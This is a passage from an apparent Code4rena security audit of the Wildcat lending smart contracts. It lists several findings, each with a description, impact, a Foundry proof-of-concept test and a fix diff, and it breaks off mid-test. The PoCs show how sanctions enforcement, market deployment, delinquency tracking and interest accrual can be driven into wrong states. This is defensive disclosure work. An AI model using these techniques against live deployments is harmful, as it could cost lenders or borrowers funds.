If a market is removed, lenders that are sanctioned on Chainalysis cannot be blocked using `nukeFromOrbit()` since the function will always revert.

This is problematic as sanctioned addresses will still be able to interact with the market in various ways, such as [transferring market tokens](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketToken.sol#L64-L82), [making deposits](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L31-L77) or calling [`queueWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L74-L121), when they should not be able to.

Sanctioned lenders will also be unable to call `executeWithdrawal()` to withdraw their assets from the market into their own escrows.

### Proof of Concept

The following test demonstrates how `nukeFromOrbit()` and `executeWithdrawal()` will revert for sanctioned lenders when a market is removed from the `WildcatArchController` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatSanctionsSentinel.sol';
import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';
import 'src/interfaces/IWildcatSanctionsSentinel.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CreateEscrowTest is Test {
    // Wildcat contracts
    WildcatSanctionsSentinel sentinel;
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockChainalysis chainalysis = new MockChainalysis();
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        sentinel = new WildcatSanctionsSentinel(address(archController), address(chainalysis));
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(sentinel),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);

        // Deploy controller and market for Aiken
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);
    }

    function test_removingMarketDOSCreateEscrow() public {
        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);

        // Queue withdrawal for Dueet
        market.queueWithdrawal(500e18);
        vm.stopPrank();

        // Time passes until the withdrawal expires
        skip(MaximumWithdrawalBatchDuration);

        // Dueet becomes sanctioned
        chainalysis.sanction(DUEET);

        // Market get removes from archController
        archController.removeMarket(address(market));

        // nukeFromOrbit() reverts for Dueet
        vm.expectRevert(IWildcatSanctionsSentinel.NotRegisteredMarket.selector);
        market.nukeFromOrbit(DUEET);

        // executeWithdrawal() also reverts for Dueet
        vm.expectRevert(IWildcatSanctionsSentinel.NotRegisteredMarket.selector);
        market.executeWithdrawal(DUEET, uint32(block.timestamp));
    }
}

contract MockChainalysis {
    mapping(address => bool) public isSanctioned;

    function sanction(address addr) external {
        isSanctioned[addr] = true;
    }
}
```

### Recommended Mitigation

Consider implementing a way to track removed markets in `WildcatArchController`. For example, a new `EnumerableSet` named `_removedMarkets` could be added.

This can be used to allow removed markets to call `createEscrow()` as such:

[WildcatSanctionsSentinel.sol#L95-L102](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatSanctionsSentinel.sol#L95-L102)

```diff
  function createEscrow(
    address borrower,
    address account,
    address asset
  ) public override returns (address escrowContract) {
-   if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender)) {
+   if (!IWildcatArchController(archController).isRegisteredMarket(msg.sender) && !IWildcatArchController(archController).isRemovedMarket(msg.sender)) {
      revert NotRegisteredMarket();
    }
```

## [M-04] `create2WithStoredInitCode()` does not revert if contract deployment failed

### Bug Description

In `LibStoredInitCode.sol`, the `create2WithStoredInitCode()` function, which is used to deploy contracts with the `CREATE2` opcode, is as shown:

[LibStoredInitCode.sol#L106-L117](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/LibStoredInitCode.sol#L106-L117)

```solidity
  function create2WithStoredInitCode(
    address initCodeStorage,
    bytes32 salt,
    uint256 value
  ) internal returns (address deployment) {
    assembly {
      let initCodePointer := mload(0x40)
      let initCodeSize := sub(extcodesize(initCodeStorage), 1)
      extcodecopy(initCodeStorage, initCodePointer, 1, initCodeSize)
      deployment := create2(value, initCodePointer, initCodeSize, salt)
    }
  }
```

The `create2` opcode returns `address(0)` if contract deployment reverted. However, as seen from above,  `create2WithStoredInitCode()` does not check if the `deployment` address is `address(0)`.

This is an issue as `deployMarket()` will not revert when deployment of the `WildcatMarket` contract fails:

[WildcatMarketController.sol#L354-L357](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L354-L357)

```solidity
    LibStoredInitCode.create2WithStoredInitCode(marketInitCodeStorage, salt);

    archController.registerMarket(market);
    _controlledMarkets.add(market);
```

Therefore, if the origination fee is enabled for the protocol, users that call `deployMarket()` will pay the origination fee even if the market was not deployed.

Additionally, the `market` address will be registered in the `WildcatArchController` contract and added to `_addControlledMarkets`. This will cause both sets to become inaccurate if deployment failed as `market` would be an address that has no code.

This also leads to more problems if a user attempts to call `deployMarket()` with the same `asset`, `namePrefix` and `symbolPrefix`. Since the `market` address has already been registered, `registerMarket()` will revert when called for a second time:

[WildcatArchController.sol#L192-L195](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatArchController.sol#L192-L195)

```solidity
  function registerMarket(address market) external onlyController {
    if (!_markets.add(market)) {
      revert MarketAlreadyExists();
    }
```

As such, if a user calls `deployMarket()` and market deployment fails, he cannot call `deployMarket()` with the same set of parameters ever again.

Note that it is possible for market deployment to fail, as seen in the constructor of `WildcatMarketBase`:

[WildcatMarketBase.sol#L79-L99](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L79-L99)

```solidity
    if ((parameters.protocolFeeBips > 0).and(parameters.feeRecipient == address(0))) {
      revert FeeSetWithoutRecipient();
    }
    if (parameters.annualInterestBips > BIP) {
      revert InterestRateTooHigh();
    }
    if (parameters.reserveRatioBips > BIP) {
      revert ReserveRatioBipsTooHigh();
    }
    if (parameters.protocolFeeBips > BIP) {
      revert InterestFeeTooHigh();
    }
    if (parameters.delinquencyFeeBips > BIP) {
      revert PenaltyFeeTooHigh();
    }

    // Set asset metadata
    asset = parameters.asset;
    name = string.concat(parameters.namePrefix, queryName(parameters.asset));
    symbol = string.concat(parameters.symbolPrefix, querySymbol(parameters.asset));
    decimals = IERC20Metadata(parameters.asset).decimals();
```

For example, the protocol could have configured `protocolFeeBips` or `feeRecipient` incorrectly. Alternatively, `asset` could be an invalid address, or an ERC20 token that does not have the `name()`, `symbol()` or `decimal()` function.

### Impact

Since `deployMarket()` does not revert when creation of the `WildcatMarket` contract fails, users will pay the origination fee for failed deployments, causing a loss of funds. 

Additionally, `deployMarket()` will not be callable for the same `asset`, `namePrefix` and `symbolPrefix`, thus a user can never deploy a market with these parameters.

### Proof of Concept

The following test demonstrates how `deployMarket()` does not revert even if deployment of the `WildcatMarket` contract failed, and how it reverts when attempting to deploy the same market with valid parameters afterwards:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract MarketDeploymentRevertTest is Test {
    // Wildcat contracts
    WildcatArchController archController;
    WildcatMarketControllerFactory controllerFactory;
    WildcatMarketController controller;
    
    // Test contracts
    MockERC20 originationFeeAsset = new MockERC20();
    MockERC20 marketAsset = new MockERC20();

    // Users
    address BORROWER;

    function setUp() external {
        // Deploy Wildcat contracts
        archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup borrower
        BORROWER = makeAddr("BORROWER");
        originationFeeAsset.mint(BORROWER, 10e18);
        archController.registerBorrower(BORROWER);

        // Deploy controller
        vm.prank(BORROWER);
        controller = WildcatMarketController(controllerFactory.deployController());
    }

    function test_marketDeploymentDoesntRevert() public {
        // Set protocol fee to larger than BIP
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(originationFeeAsset),
            5e18, // originationFeeAmount,
            1e4 + 1 // protocolFeeBips
        );

        string memory namePrefix = "Market ";
        string memory symbolPrefix = "MKT-";

        // deployMarket() does not revert
        vm.startPrank(BORROWER);
        originationFeeAsset.approve(address(controller), 5e18);
        address market = controller.deployMarket(
            address(marketAsset),
            namePrefix,
            symbolPrefix,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        vm.stopPrank();

        // However, the market was never deployed and borrower paid the origination fee
        assertEq(market.code.length, 0);
        assertEq(originationFeeAsset.balanceOf(BORROWER), 5e18);

        // Set protocol fee to valid value
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(originationFeeAsset),
            5e18, // originationFeeAmount,
            0 // protocolFeeBips
        );

        // Call deployMarket() with valid parameters reverts as market address is already registered
        vm.startPrank(BORROWER);
        originationFeeAsset.approve(address(controller), 5e18);
        vm.expectRevert(WildcatArchController.MarketAlreadyExists.selector);
        market = controller.deployMarket(
            address(marketAsset),
            namePrefix,
            symbolPrefix,
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        vm.stopPrank();
    }
}
```

### Recommended Mitigation

In `create2WithStoredInitCode()`, consider checking if the `deployment` address is `address(0)`, and reverting if so:

[LibStoredInitCode.sol#L106-L117](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/LibStoredInitCode.sol#L106-L117)

```diff
  function create2WithStoredInitCode(
    address initCodeStorage,
    bytes32 salt,
    uint256 value
  ) internal returns (address deployment) {
    assembly {
      let initCodePointer := mload(0x40)
      let initCodeSize := sub(extcodesize(initCodeStorage), 1)
      extcodecopy(initCodeStorage, initCodePointer, 1, initCodeSize)
      deployment := create2(value, initCodePointer, initCodeSize, salt)
+     if iszero(deployment) {
+         mstore(0x00, 0x30116425) // DeploymentFailed()
+         revert(0x1c, 0x04)
+     }
    }
  }
```

## [M-05] `collectFees()` updates delinquency wrongly as `_writeState()` is called before assets are transferred 

### Bug Description

The `collectFees()` function calls `_writeState()` before transferring assets to the `feeRecipient`:

[WildcatMarket.sol#L106-L107](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L106-L107)

```solidity
    _writeState(state);
    asset.safeTransfer(feeRecipient, withdrawableFees);
```

However, `_writeState()` calls `totalAssets()` when checking if the market is delinquent:

[WildcatMarketBase.sol#L448-L453](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L448-L453)

```solidity
  function _writeState(MarketState memory state) internal {
    bool isDelinquent = state.liquidityRequired() > totalAssets();
    state.isDelinquent = isDelinquent;
    _state = state;
    emit StateUpdated(state.scaleFactor, isDelinquent);
  }
```

`totalAssets()` returns the current asset balance of the market:

[WildcatMarketBase.sol#L238-L240](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L238-L240)

```solidity
  function totalAssets() public view returns (uint256) {
    return IERC20(asset).balanceOf(address(this));
  }
```

Since the transfer of assets is only performed _after_ `_writeState()` is called, `totalAssets()` will be higher than it should be in `_writeState()`. This could cause `collectFees()` to incorrectly update `state.isDelinquent` to `false` when the market is still delinquent.

For example:
- Assume a market has the following state:
  - `liquidityRequired() = 1050`
  - `totalAssets() = 1000`
  - `state.accruedProtocolFees = 50`
- The market's borrower calls `collectFees()`. In `_writeState()`:
  - `liquidityRequired() = 1050 - 50 = 1000`
  - `totalAssets() = 1000` since the transfer of assets has not occurred.
  - As `liquidityRequired() == totalAssets()`, `isDelinquent` is updated to `false`. 
  - However, the market is actually still delinquent as `totalAssets()` will be `950` after the call to `collectFees()`.

### Impact

`collectFees()` will incorrectly update the market to non-delinquent when `liquidityRequired() < totalAssets() + state.accuredProtocolFees`.

Should this occur, the [delinquency fee](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/FeeMath.sol#L159-L169) will not be added to `scaleFactor` until the market's state is updated later on, causing a loss of yield for lenders since the borrower gets to avoid paying the penalty fee for a period of time.

### Proof of Concept

The following test demonstrates how `collectFees()` incorrectly updates `state.isDelinquent` to `false` when the market is still delinquent:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract CollectFeesTest is Test {
    // Wildcat contracts
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        WildcatArchController archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: MinimumReserveRatioBips,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: MinimumDelinquencyFeeBips,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Set protocol fee to 10%
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(0),
            0, 
            1000 // protocolFeeBips
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup Aiken and register him as borrower
        AIKEN = makeAddr("AIKEN");
        archController.registerBorrower(AIKEN);
        asset.mint(AIKEN, 1000e18);

        // Setup Dueet and give him some asset token
        DUEET = makeAddr("DUEET");
        asset.mint(DUEET, 1000e18);
        
        // Deploy controller and market for Aiken
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            MaximumAnnualInterestBips,
            MaximumDelinquencyFeeBips,
            MaximumWithdrawalBatchDuration,
            MaximumReserveRatioBips,
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);
    }

    function test_collectFeesUpdatesDelinquencyWrongly() public {
        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);

        // Dueet becomes a lender in the market
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Some time passes, market becomes delinquent
        skip(2 weeks);
        market.updateState();
        MarketState memory state = market.previousState();
        assertTrue(state.isDelinquent);

        // Aiken tops up some assets
        uint256 amount = market.coverageLiquidity() -  market.totalAssets() - market.accruedProtocolFees();
        vm.prank(AIKEN);
        asset.transfer(address(market), amount);
        
        // Someone calls collectFees()
        market.collectFees();

        // Market was updated to not delinquent
        state = market.previousState();
        assertFalse(state.isDelinquent);

        // However, it should be delinquent as liquidityRequired > totalAssets()
        assertGt(market.coverageLiquidity(), market.totalAssets());
    }
}
```

### Recommended Mitigation

In `collectFees()`, consider calling `_writeState()` after assets have been transferred to the `feeRecipient`:

[WildcatMarket.sol#L106-L107](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L106-L107)

```diff
-   _writeState(state);
    asset.safeTransfer(feeRecipient, withdrawableFees);
+   _writeState(state);
```

## [M-06] Calculation for lender withdrawals in `_applyWithdrawalBatchPayment()` should not round up

### Bug Description

After a lender calls [`queueWithdrawal()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketWithdrawals.sol#L74-L121), the amount of assets allocated to a withdrawal batch is calculated  in `_applyWithdrawalBatchPayment()` as shown:

[WildcatMarketBase.sol#L510-L518](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L510-L518)

```solidity
    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));
    uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();

    batch.scaledAmountBurned += scaledAmountBurned;
    batch.normalizedAmountPaid += normalizedAmountPaid;
    state.scaledPendingWithdrawals -= scaledAmountBurned;

    // Update normalizedUnclaimedWithdrawals so the tokens are only accessible for withdrawals.
    state.normalizedUnclaimedWithdrawals += normalizedAmountPaid;
```

The calculation relies on [`normalizeAmount()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/MarketState.sol#L63-L71) to convert the amount of market tokens in a batch into assets. 

However, as `normalizeAmount()` rounds up, it might cause the amount of assets allocated to a batch to be 1 higher than the correct amount. For example, if [`availableLiquidity`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L502) is `77e6` USDC, `normalizedAmount` could become `77e6 + 1` after calculation due to rounding.

This is problematic as it causes `totalDebts()` to increase, causing the market to incorrectly become delinquent after `_applyWithdrawalBatchPayment()` is called although the borrower has transferred sufficient assets. 

More specifically, if a [market's asset balance](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L238-L240) is equal to [`totalDebts()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/MarketState.sol#L138-L143), it should never be delinquent regardless of what function is called as the market has sufficient assets to cover the amount owed. However, due to the bug shown above, this could occur after a function such as `queueWithdrawal()` is called.

### Impact

A market could incorrectly become delinquent after `_applyWithdrawalBatchPayment()` is called. 

This could cause a borrower to wrongly pay a higher interest rate, for example:
- Borrower calls `totalDebts()` to get the amount of assets owed.
- Borrower transfers the assets to the market and calls [`updateState()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L20-L29).
- Borrower assumes that the market is no longer delinquent.
- However, due to the bug above, the market becomes delinquent after a lender calls `queueWithdrawal()`.
- This activates the delinquency fee, causing the borrower to pay a higher interest rate.

Additionally, this bug also makes it possible for a market to become delinquent *after* it is closed through [`closeMarket()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L133-L161), which should not be possible.

### Proof of Concept

The code below contains two tests:
- `test_queueWithdrawalRoundingAffectsDelinquency()` demonstrates how rounding up in `_applyWithdrawalBatchPayment()` could make the market delinquent even when it should not be.
- `test_marketCanBecomeDelinquentAfterClosing()` shows how a market can become delinquent even after `closeMarket()` is called.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract WithdrawalRoundingTest is Test {
    // Wildcat contracts
    WildcatMarketController controller;
    WildcatMarket market;
    
    // Test contracts
    MockERC20 asset = new MockERC20();

    // Users
    address AIKEN;
    address DUEET;

    function setUp() external {
        // Deploy Wildcat contracts
        WildcatArchController archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
            minimumReserveRatioBips: 0,
            maximumReserveRatioBips: MaximumReserveRatioBips,
            minimumDelinquencyFeeBips: 0,
            maximumDelinquencyFeeBips: MaximumDelinquencyFeeBips,
            minimumWithdrawalBatchDuration: MinimumWithdrawalBatchDuration,
            maximumWithdrawalBatchDuration: MaximumWithdrawalBatchDuration,
            minimumAnnualInterestBips: MinimumAnnualInterestBips,
            maximumAnnualInterestBips: MaximumAnnualInterestBips
        });
        WildcatMarketControllerFactory controllerFactory = new WildcatMarketControllerFactory(
            address(archController),
            address(0),
            constraints
        );

        // Set protocol fee to 10%
        controllerFactory.setProtocolFeeConfiguration(
            address(1),
            address(0),
            0, 
            1000 // protocolFeeBips
        );

        // Register controllerFactory in archController
        archController.registerControllerFactory(address(controllerFactory));

        // Setup users
        AIKEN = makeAddr("AIKEN");
        DUEET = makeAddr("DUEET");
        asset.mint(AIKEN, 1000e18);
        asset.mint(DUEET, 1000e18);
        
        // Deploy controller and market for Aiken
        archController.registerBorrower(AIKEN);
        vm.prank(AIKEN);
        (address _controller, address _market) = controllerFactory.deployControllerAndMarket(
            "Market Token",
            "MKT",
            address(asset),
            type(uint128).max,
            50, // annual interest rate = 5%
            300, // delinquency fee = 30%
            3 weeks,
            300, // reserve ratio = 30%
            MaximumDelinquencyGracePeriod
        );
        controller = WildcatMarketController(_controller);
        market = WildcatMarket(_market);

        // Register Dueet as lender
        address[] memory arr = new address[](1);
        arr[0] = DUEET;
        vm.prank(AIKEN);
        controller.authorizeLenders(arr);
    }

    function test_queueWithdrawalRoundingAffectsDelinquency() public {
        // Dueet deposits 1000e18 tokens
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Aiken borrows all assets
        uint256 amount = market.borrowableAssets();
        vm.prank(AIKEN);
        market.borrow(amount);

        // 1 day and 1 second passes
        skip(1 days + 1);

        // Aiken transfers assets so that market won't be delinquent even after full withdrawal
        amount = market.currentState().totalDebts() - market.totalAssets();
        vm.prank(AIKEN);
        asset.transfer(address(market), amount);

        // Collect fees
        market.collectFees();

        // Save snapshot before withdrawals
        uint256 snapshot = vm.snapshot();

        // Market won't be delinquent if Dueet withdraws all tokens at once
        amount = market.balanceOf(DUEET);
        vm.prank(DUEET);
        market.queueWithdrawal(amount);
        assertFalse(market.currentState().isDelinquent);

        // Revert state to before withdrawals
        vm.revertTo(snapshot);

        // Dueet withdraws 710992167266111033190 tokens
        vm.prank(DUEET);
        market.queueWithdrawal(710992167266111033190);

        // Dueet withdraws the rest of his tokens
        amount = market.balanceOf(DUEET);
        vm.prank(DUEET);
        market.queueWithdrawal(amount);

        // Market is now delinquent although same amount of tokens was withdrawn
        assertTrue(market.currentState().isDelinquent);
    }

    function test_marketCanBecomeDelinquentAfterClosing() public {
        // Dueet deposits 1000e18 tokens
        vm.startPrank(DUEET);
        asset.approve(address(market), 1000e18);
        market.depositUpTo(1000e18);
        vm.stopPrank();

        // Aiken borrows all assets
        uint256 amount = market.borrowableAssets();
        vm.prank(AIKEN);
        market.borrow(amount);

        // 1 day and 1 second passes
        skip(1 days + 1);

        // Aiken closes the market
        amount = market.currentState().totalDebts();
        vm.prank(AIKEN);
        asset.approve(address(market), amount);
        vm.prank(address(controller));
        market.closeMarket();

        // Collect fees
        market.collectFees();

        // Dueet withdraws 710992167266111033190 tokens
        vm.prank(DUEET);
        market.queueWithdrawal(710992167266111033190);

        // Dueet withdraws the rest of his tokens
        amount = market.balanceOf(DUEET);
        vm.prank(DUEET);
        market.queueWithdrawal(amount);

        // Market is now delinquent, even though it has been closed
        assertTrue(market.currentState().isDelinquent);
    }
}
```

### Recommended Mitigation

In `_applyWithdrawalBatchPayment()`, consider rounding down when calculating the amount of assets allocated to a batch:

[WildcatMarketBase.sol#L510-L511](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarketBase.sol#L510-L511)

```diff
    uint104 scaledAmountBurned = uint104(MathUtils.min(scaledAvailableLiquidity, scaledAmountOwed));
-   uint128 normalizedAmountPaid = state.normalizeAmount(scaledAmountBurned).toUint128();
+   uint128 normalizedAmountPaid = MathUtils.mulDiv(scaledAmountBurned, state.scaleFactor, MathUtils.RAY).toUint128();
```

## [M-07] Protocol markets are incompatible with rebasing tokens

### Bug Description

Some tokens (eg. [AMPL](https://etherscan.io/token/0xd46ba6d942050d489dbd938a2c909a5d5039a161)), known as rebasing tokens, have dynamic balances. This means that the token balance of an address could increase or decrease over time.

However, markets in the protocol are unable to handle such changes in token balance. When lenders call `depositUpTo()`, the amount of assets they deposit is stored as a fixed amount in `account.scaledBalance`:

[WildcatMarket.sol#L56-L65](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L56-L65)

```solidity
    uint104 scaledAmount = state.scaleAmount(amount).toUint104();
    if (scaledAmount == 0) revert NullMintAmount();

    // Transfer deposit from caller
    asset.safeTransferFrom(msg.sender, address(this), amount);

    // Cache account data and revert if not authorized to deposit.
    Account memory account = _getAccountWithRole(msg.sender, AuthRole.DepositAndWithdraw);
    account.scaledBalance += scaledAmount;
    _accounts[msg.sender] = account;
```

Afterwards, when lenders want to withdraw their assets, the amount of assets that they can withdraw will be based off this value.

Therefore, since a lender's `scaledBalance` is fixed and does not change according to the underlying asset balance, lenders will lose funds if they deposit into a market with a rebasing token as the asset. 

For example, if AMPL is used as the market's asset, and AMPL rebases to increase the token balance of all its users, lenders in the market will still only be able to withdraw the original amount they deposited multiplied by the market's interest rate. The underlying increase in AMPL will not accrue to anyone, and is only accessible by the borrower by calling [`borrow()`](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/market/WildcatMarket.sol#L111-L131).

### Impact

If a market uses a rebasing tokens as its asset, lenders will lose funds when the asset token rebases.

### Recommended Mitigation

Consider implementing a token blacklist in the protocol, such as in `WildcatArchController`, and adding all rebasing tokens to this blacklist.

Additionally, consider documenting that markets are not compatible with rebasing tokens.

## [L-01] Interest rates might be inflated slightly above the market's annual interest rate

### Bug Description

Whenever the state of a market is updated, `updateScaleFactorAndFees()` is called to increase the market's `scaleFactor` based on the annual interest rate:

[FeeMath.sol#L167-L171](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/libraries/FeeMath.sol#L167-L171)

```solidity
    // Calculate new scaleFactor
    uint256 prevScaleFactor = state.scaleFactor;
    uint256 scaleFactorDelta = prevScaleFactor.rayMul(baseInterestRay + delinquencyFeeRay);

    state.scaleFactor = (prevScaleFactor + scaleFactorDelta).toUint112();
```

As seen from above, the interest rate is not a fixed rate based on time, but rather, it compounds depending on how frequently `updateScaleFactorAndFees()` is called.

Due to how [compound interest works](https://www.investopedia.com/terms/c/compoundinterest.asp) works, if `updateState()` is called repeatedly, the final amount owed by the borrower in a market will be higher as compared to if `updateState()` was called once.

### Impact

Markets which have their state updated more frequently will have a slightly higher interest rate, which means the borrower will owe lenders slightly more assets. This could occur if:
- The market is popular, and state-changing functions are always called.
- A lender intentionally calls `updateState()` repeatedly.

This leads to a slight loss of funds for the borrower, and a slight gain for lenders.

### Proof of Concept

The following test demonstrates how the assets owed by a borrower after a year will be 0.1% higher if `updateState()` is called for a market every week:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

import 'src/WildcatArchController.sol';
import 'src/WildcatMarketControllerFactory.sol';

import 'forge-std/Test.sol';
import 'test/shared/TestConstants.sol';
import 'test/helpers/MockERC20.sol';

contract MarketAnuualInterestRateTest is Test {
    // Wildcat contracts
    WildcatMarketController controller;
    
    // Test contracts
    MockERC20 asset = new MockERC20();

    // Users
    address BORROWER;
    address LENDER;

    function setUp() external {
        // Deploy Wildcat contracts
        WildcatArchController archController = new WildcatArchController();
        MarketParameterConstraints memory constraints = MarketParameterConstraints({
            minimumDelinquencyGracePeriod: MinimumDelinquencyGracePeriod,
            maximumDelinquencyGracePeriod: MaximumDelinquencyGracePeriod,
